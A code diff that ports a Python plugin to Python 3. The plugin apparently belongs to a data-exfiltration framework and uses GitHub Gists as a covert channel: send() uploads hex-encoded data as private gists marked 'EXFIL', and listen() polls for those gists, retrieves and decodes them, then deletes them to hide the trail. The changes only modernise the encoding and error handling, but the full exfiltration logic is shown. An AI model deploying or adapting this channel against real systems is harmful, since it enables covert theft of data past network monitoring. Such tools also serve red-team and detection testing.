@@ -1,4 +1,5 @@
 from github import *
+import binascii
 import github
 import time
 import requests
@@ -8,30 +9,33 @@ g = None
 
 def send(data):
     app_exfiltrate.log_message('info', "[github] Sending {} bytes with Github".format(len(data)))
-    g.get_user().create_gist(False, {'foobar.txt': github.InputFileContent(data.encode('hex'))}, 'EXFIL')
+    g.get_user().create_gist(False, {'foobar.txt': github.InputFileContent(binascii.hexlify(data.encode()))}, 'EXFIL')
 
 def listen():
     app_exfiltrate.log_message('info', "[github] Checking for Gists")
-    while True:
-        gists = g.get_user().get_gists()
-        tmp_gists = []
-        for gist in gists:
-            tmp_gists.append(gist)
-        for gist in tmp_gists[::-1]:
-            if gist.description == 'EXFIL':
-                url = gist.files['foobar.txt'].raw_data['raw_url']
-                req = requests.get(url)
-                content = req.content
-                try:
-                    content = content.decode('hex')
-                    app_exfiltrate.log_message('info', "[github] Receiving {} bytes within Gist".format(len(content)))
-                    app_exfiltrate.retrieve_data(content)
-                except Exception, err:
-                    # print(err)
-                    pass
-                finally:
-                    gist.delete()
+    try:
+        while True:
+            gists = g.get_user().get_gists()
+            tmp_gists = []
+            for gist in gists:
+                tmp_gists.append(gist)
+            for gist in tmp_gists[::-1]:
+                if gist.description == 'EXFIL':
+                    url = gist.files['foobar.txt'].raw_data['raw_url']
+                    req = requests.get(url)
+                    content = req.content
+                    try:
+                        content = binascii.unhexlify(content)
+                        app_exfiltrate.log_message('info', "[github] Receiving {} bytes within Gist".format(len(content)))
+                        app_exfiltrate.retrieve_data(content)
+                    except Exception as err:
+                        # print(err)
+                        pass
+                    finally:
+                        gist.delete()
         time.sleep(5)
+    except github.GithubException:
+        print("GitHub Rate Limit Exceeded")
 
 class Plugin:
 
